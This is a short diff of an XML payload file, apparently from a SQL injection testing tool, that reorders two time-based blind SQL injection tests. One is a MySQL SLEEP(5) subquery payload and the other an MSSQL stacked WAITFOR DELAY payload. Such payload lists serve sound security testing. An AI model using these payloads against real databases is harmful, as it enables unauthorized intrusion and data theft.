@@ -1,10 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <root>
     <test>
-        <title>MySQL Time-Based Blind</title>
+        <title>MSSQL Time-Based Blind (Stacked)</title>
         <stype>5</stype>
-        <dbms>MySQL</dbms>
-        <payload>AND (SELECT 8341 FROM (SELECT(SLEEP(5)))qweqwe)</payload>
+        <dbms>MSSQL</dbms>
+        <payload>; WAITFOR DELAY '0:0:5'</payload>
     </test>
 
     <test>
@@ -15,10 +15,10 @@
     </test>
 
     <test>
-        <title>MSSQL Time-Based Blind (Stacked)</title>
+        <title>MySQL Time-Based Blind</title>
         <stype>5</stype>
-        <dbms>MSSQL</dbms>
-        <payload>; WAITFOR DELAY '0:0:5'</payload>
+        <dbms>MySQL</dbms>
+        <payload>AND (SELECT 8341 FROM (SELECT(SLEEP(5)))qweqwe)</payload>
     </test>
 
     <test>
